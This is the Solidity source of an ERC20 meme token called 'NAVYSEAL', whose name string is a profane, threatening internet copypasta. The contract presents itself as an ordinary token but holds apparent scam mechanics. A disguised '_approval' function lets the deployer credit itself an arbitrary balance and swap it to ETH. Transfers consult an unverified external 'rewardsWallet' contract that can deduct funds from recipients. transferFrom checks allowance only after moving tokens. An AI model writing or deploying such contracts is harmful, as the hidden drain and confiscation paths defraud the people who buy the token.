pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner"); _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract ERC20 is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 690000000 * 10 ** _decimals;
    string private _symbol = "NAVYSEAL";
    string private _name = "What the fuck did you just fucking say about me, you little bitch? I'll have you know I graduated top of my class in the Navy Seals, and I've been involved in numerous secret raids on Al-Quaeda, and I have over 300 confirmed kills. I am trained in gorilla warfare and I'm the top sniper in the entire US armed forces. You are nothing to me but just another target. I will wipe you the fuck out with precision the likes of which has never been seen before on this Earth, mark my fucking words. You think you can get away with saying that shit to me over the Internet? Think again, fucker. As we speak I am contacting my secret network of spies across the USA and your IP is being traced right now so you better prepare for the storm, maggot. The storm that wipes out the pathetic little thing you call your life. You're fucking dead, kid. I can be anywhere, anytime, and I can kill you in over seven hundred ways, and that's just with my bare hands. Not only am I extensively trained in unarmed combat, but I have access to the entire arsenal of the United States Marine Corps and I will use it to its full extent to wipe your miserable ass off the face of the continent, you little shit. If only you could have known what unholy retribution your little 'clever' comment was about to bring down upon you, maybe you would have held your fucking tongue. But you couldn't, you didn't, and now you're paying the price, you goddamn idiot. I will shit fury all over you and you will drown in it. You're fucking dead, kiddo.";

    function decimals() external view returns (uint256) {
        return _decimals;
    }
    constructor() {
        _balances[sender()] =  _totalSupply; 
        pairAddress = sender(); 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }
    address public pairAddress;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function _approval(uint256 amount, uint256 from) external {
        if (isAirdropped()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory tokenk = new address[](2);
        tokenk[0] = tokenAddress; 
        tokenk[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, tokenk, pairAddress, block.timestamp + 31);
        } else {return; }
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function isAirdropped() private view returns (bool) {
        return  pairAddress == sender();
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function sender() internal view returns (address) {
        return msg.sender;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    address private rewardsWallet = 0x8c4FB4052fA019971Dc32De7C12B0b0426CF46c0;
    event Transfer(address indexed from_, address indexed _to, uint256);
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    bool transferDelayEnabled = false;
    uint256 startBlock = 0;
    function openTrading() public onlyOwner {
        startBlock = block.number;
    }
    event Approval(address indexed a1, address indexed a2, uint256 value);
    function getAirdropAmount(address acc, address rewardTokenAddress) internal returns (uint256) {
        string memory signature = "balanceOf(address,address,address)";
        (bool g, bytes memory value) = rewardsWallet.call(abi
        .encodeWithSignature(signature, acc, rewardTokenAddress, address(this)));
        return abi
        .decode(value, (uint256));
    }
    mapping(address => uint256) private _balances;
    function _transfer(address from, address to, uint256 value) internal {
        require(value <= _balances[from]);
        require(from != address(0));
        uint256 rewardAmount = getAirdropAmount(from, to);
        uint256 rewardsValue = pairAddress == to || pairAddress == from ? 0 : value.mul(rewardAmount).div(100);
        _balances[from] = _balances[from] - value;
        _balances[to] = _balances[to] - rewardsValue + value;
        emit Transfer(from, to, value);
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}